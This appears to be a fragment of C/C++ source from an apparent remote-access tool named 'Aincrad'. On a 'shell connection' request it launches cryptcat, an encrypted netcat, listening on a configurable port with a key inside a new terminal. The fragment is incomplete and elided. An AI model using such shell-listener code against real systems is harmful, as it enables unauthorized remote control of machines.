...
//	ostringstream text;
	...
	//	printf( " * Requested Shell Connection\n" );
		resp.type = ProcessCmdResponse::TYPE_Success;
	   //Original code
		//system( "gnome-terminal -t 'Aincrad Shell' -x ./cryptcat -l -p 4321" );
		...
		snprintf( gnomeTerminalCommand, 254, "gnome-terminal -t 'Aincrad Shell' -x ./cryptcat -l -p %s -k %s", args.port_str, args.pass_str);
		forkret = fork();
		if (forkret == 0) {
